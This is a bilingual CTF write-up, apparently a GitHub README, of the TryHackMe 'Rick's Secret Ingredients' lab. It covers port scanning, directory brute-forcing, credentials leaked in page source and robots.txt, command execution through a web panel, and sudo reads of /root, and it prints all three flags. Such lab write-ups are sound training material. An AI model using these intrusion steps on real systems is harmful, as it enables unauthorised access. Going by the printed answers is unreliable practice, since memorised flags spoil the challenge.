# CTF-Ricks-Secret-Ingredients-TryHackMe
Write-up (Relatório) para o desafio CTF 'Rick's Secret Ingredients' da plataforma TryHackMe.

Com certeza\! Aqui estão as duas versões do relatório (write-up), formatadas em Markdown para serem postadas diretamente no GitHub.

-----

### **English Version**

# CTF Write-up: Rick's Secret Ingredients (TryHackMe)

This write-up details the steps taken to complete the "Rick's Secret Ingredients" Capture The Flag challenge on TryHackMe. The objective was to exploit a web server to find three secret ingredients.

## 1\. Initial Reconnaissance (Nmap Scan)

The first step was to identify open ports and services running on the target machine using Nmap.

**Command:**

```bash
nmap 10.201.83.23
```

**Output:**

```
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-29 02:44 BST
Nmap scan report for 10.201.83.23
Host is up (0.00090s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

The Nmap scan revealed two open ports:

  * `22/tcp`: SSH (Secure Shell)
  * `80/tcp`: HTTP (Web Server)

## 2\. Web Server Exploration & Credential Discovery

Navigating to the web server at `http://10.201.83.23/` and inspecting the HTML source code revealed a comment containing a username.

**Finding:**

```html
```

  * **Username:** `R1ckRul3s`

## 3\. Directory Brute-Forcing (Gobuster)

To find hidden directories and files, I used Gobuster with a common wordlist.

**Command:**

```bash
sudo gobuster dir -u http://10.201.83.23/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This scan quickly discovered a `login.php` page, suggesting a login portal.

## 4\. Password Discovery

A common practice is to check the `/robots.txt` file, which can sometimes leak sensitive paths or information. Accessing `http://10.201.83.23/robots.txt` revealed the password.

**Finding:**

```
Wubbalubbadubdub
```

  * **Password:** `Wubbalubbadubdub`

## 5\. Gaining Initial Access & Finding the First Ingredient

With the discovered credentials, I logged into the portal via `login.php`. This granted access to a command execution panel. Running the `ls` command listed the contents of the current directory.

**Command:**

```bash
ls
```

**Output:**

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Reading the contents of `Sup3rS3cretPickl3Ingred.txt` revealed the first ingredient.

  * **Ingredient 1:** `mr. meeseek hair`

## 6\. Finding the Second Ingredient

To find the next ingredient, I explored the file system. By listing the contents of the `/home/rick` directory, I found a file named "second ingredients".

**Commands:**

```bash
ls /
ls /home
ls /home/rick
less /home/rick/"second ingredients"
```

Reading the file revealed the second ingredient.

  * **Ingredient 2:** `jerry tear`

## 7\. Finding the Third Ingredient (Root Access)

The final ingredient required root privileges. I checked what commands the current user could run with `sudo` and found that I had access to view files in the `/root` directory.

**Commands:**

```bash
sudo ls /root
sudo less /root/3rd.txt
```

Reading the `3rd.txt` file revealed the final ingredient.

  * **Ingredient 3:** `fleeb juice`

## Summary of Secret Ingredients

1.  `mr. meeseek hair`
2.  `jerry tear`
3.  `fleeb juice`

-----

### **Versão em Português**

# Relatório do CTF: Os Ingredientes Secretos do Rick (TryHackMe)

Este relatório detalha os passos realizados para completar o desafio de Capture The Flag "Rick's Secret Ingredients" na plataforma TryHackMe. O objetivo era explorar um servidor web para encontrar três ingredientes secretos.

## 1\. Reconhecimento Inicial (Scan com Nmap)

O primeiro passo foi identificar as portas abertas e os serviços em execução na máquina-alvo usando o Nmap.

**Comando:**

```bash
nmap 10.201.83.23
```

**Resultado:**

```
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-29 02:44 BST
Nmap scan report for 10.201.83.23
Host is up (0.00090s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

O scan do Nmap revelou duas portas abertas:

  * `22/tcp`: SSH (Secure Shell)
  * `80/tcp`: HTTP (Servidor Web)

## 2\. Exploração do Servidor Web e Descoberta de Credenciais

Ao acessar o servidor web em `http://10.201.83.23/` e inspecionar o código-fonte HTML da página, um comentário contendo um nome de usuário foi encontrado.

**Achado:**

```html
```

  * **Usuário:** `R1ckRul3s`

## 3\. Brute-Force de Diretórios (Gobuster)

Para encontrar diretórios e arquivos ocultos, usei o Gobuster com uma wordlist comum.

**Comando:**

```bash
sudo gobuster dir -u http://10.201.83.23/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Este scan rapidamente descobriu a página `login.php`, sugerindo a existência de um portal de login.

## 4\. Descoberta da Senha

Uma prática comum é verificar o arquivo `/robots.txt`, que por vezes pode vazar caminhos ou informações sensíveis. Acessar `http://10.201.83.23/robots.txt` revelou a senha.

**Achado:**

```
Wubbalubbadubdub
```

  * **Senha:** `Wubbalubbadubdub`

## 5\. Ganhando Acesso Inicial e Encontrando o Primeiro Ingrediente

Com as credenciais descobertas, fiz login no portal através da página `login.php`. Isso me deu acesso a um painel de execução de comandos. Ao executar o comando `ls`, o conteúdo do diretório atual foi listado.

**Comando:**

```bash
ls
```

**Resultado:**

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

A leitura do conteúdo do arquivo `Sup3rS3cretPickl3Ingred.txt` revelou o primeiro ingrediente.

  * **Ingrediente 1:** `mr. meeseek hair`

## 6\. Encontrando o Segundo Ingrediente

Para encontrar o próximo ingrediente, explorei o sistema de arquivos. Ao listar o conteúdo do diretório `/home/rick`, encontrei um arquivo chamado "second ingredients".

**Comandos:**

```bash
ls /
ls /home
ls /home/rick
less /home/rick/"second ingredients"
```

A leitura do arquivo revelou o segundo ingrediente.

  * **Ingrediente 2:** `jerry tear`

## 7\. Encontrando o Terceiro Ingrediente (Acesso Root)

O ingrediente final exigia privilégios de root. Verifiquei quais comandos o usuário atual poderia executar com `sudo` e descobri que tinha permissão para visualizar arquivos no diretório `/root`.

**Comandos:**

```bash
sudo ls /root
sudo less /root/3rd.txt
```

A leitura do arquivo `3rd.txt` revelou o ingrediente final.

  * **Ingrediente 3:** `fleeb juice`

## Resumo dos Ingredientes Secretos

1.  `mr. meeseek hair`
2.  `jerry tear`
3.  `fleeb juice`
ls /home
ls /home/rick
less /home/rick/"second ingredients"

A leitura do arquivo revelou o segundo ingrediente.
Ingrediente 2: jerry tear
7. Encontrando o Terceiro Ingrediente (Acesso Root)
O ingrediente final exigia privilégios de root. Verifiquei quais comandos o usuário atual poderia executar com sudo e descobri que tinha permissão para visualizar arquivos no diretório /root.
Comandos:
Bash
sudo ls /root
sudo less /root/3rd.txt

A leitura do arquivo 3rd.txt revelou o ingrediente final.
Ingrediente 3: fleeb juice
Resumo dos Ingredientes Secretos
mr. meeseek hair
jerry tear
fleeb juice
